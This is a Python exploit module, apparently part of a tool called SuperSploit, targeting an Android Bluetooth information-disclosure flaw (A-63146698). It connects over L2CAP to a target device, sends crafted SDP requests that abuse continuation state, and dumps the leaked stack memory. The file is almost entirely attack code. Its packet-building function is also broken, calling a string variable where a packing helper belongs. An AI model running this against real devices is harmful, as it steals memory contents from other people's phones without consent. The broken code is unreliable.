import json
import os

from pwn import *
import bluetooth

# integrated = True
#!#!#!
# A information disclosure vulnerability in the Android system (bluetooth).
# Product: Android. Versions: 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1,
# 7.1.2, 8.0. Android ID: A-63146698.
# REQUIRED OPTIONS
# R_HOST
#!#!#!

installation = f'{os.getenv("HOME")}/.SuperSploit'
with open(f"{installation}/.data/data.json") as file:
    variableDict = json.load(file)
    file.close()
target = variableDict["R_HOST"]
service_long = 0x0100



service_short = 0x0001

mtu = 50
n = 30

def packet(service, continuation_state):
    pkt = '\x02\x00\x00'
    pkt += pkt(7 + len(continuation_state))
    pkt += '\x35\x03\x19'
    pkt += pkt(service)
    pkt += '\x01\x00'
    pkt += continuation_state
    return pkt

p = log.progress('Exploit')
p.status('Creating L2CAP socket')

sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
context.endian = 'big'

p.status('Connecting to target')
sock.connect((target, 1))

p.status('Sending packet 0')
sock.send(packet(service_long, '\x00'))
data = sock.recv(mtu)

if data[-3] != '\x02':
    log.error('Invalid continuation state received.')

stack = ''

for i in range(1, n):
    p.status('Sending packet %d' % i)
    sock.send(packet(service_short, data[-3:]))
    data = sock.recv(mtu)
    stack += data[9:-3]

sock.close()

p.success('Done')

print(hexdump(stack))